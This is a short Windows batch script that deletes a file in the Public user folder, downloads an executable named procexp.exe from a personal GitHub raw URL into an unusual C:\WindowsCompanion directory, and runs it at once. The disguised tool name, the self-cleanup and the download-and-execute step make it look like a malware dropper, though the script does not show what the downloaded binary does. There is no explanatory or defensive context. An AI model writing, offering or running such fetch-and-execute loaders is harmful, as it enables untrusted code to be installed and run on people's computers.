@echo off

if exist "C:\Users\Public\test.bat" del "C:\Users\Public\test.bat"

set FILE_DL=C:\WindowsCompanion\procexp.exe
set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/procexp.exe
curl -L -o  "%FILE_DL%" "%URL%" && start "%FILE_DL%" && exit
